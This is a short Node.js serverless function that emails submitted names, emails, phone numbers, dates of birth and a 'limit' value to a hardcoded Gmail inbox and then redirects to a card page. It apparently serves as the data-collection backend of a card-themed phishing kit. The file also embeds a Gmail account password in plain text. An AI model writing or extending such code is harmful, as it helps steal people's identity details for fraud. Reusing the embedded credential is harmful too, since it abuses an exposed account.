const nodemailer = require("nodemailer");

module.exports = async (req, res) => {
  if (req.method !== "POST") return res.status(405).end();

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "allenshaw302@gmail.com",
      pass: "fmsreotrrcygqlyu"
    }
  });

  const mailOptions = {
    from: "allenshaw302@gmail.com",
    to: "allenshaw302@gmail.com",
    subject: "New Submission - Basic Info",
    text: `Name: ${req.body.name}
Email: ${req.body.email}
Phone: ${req.body.phone}
DOB: ${req.body.dob}
Limit: ${req.body.limit}`
  };

  try {
    await transporter.sendMail(mailOptions);
    res.redirect(302, "/card.html");
  } catch (err) {
    console.error(err);
    res.status(500).send("Failed to send email");
  }
};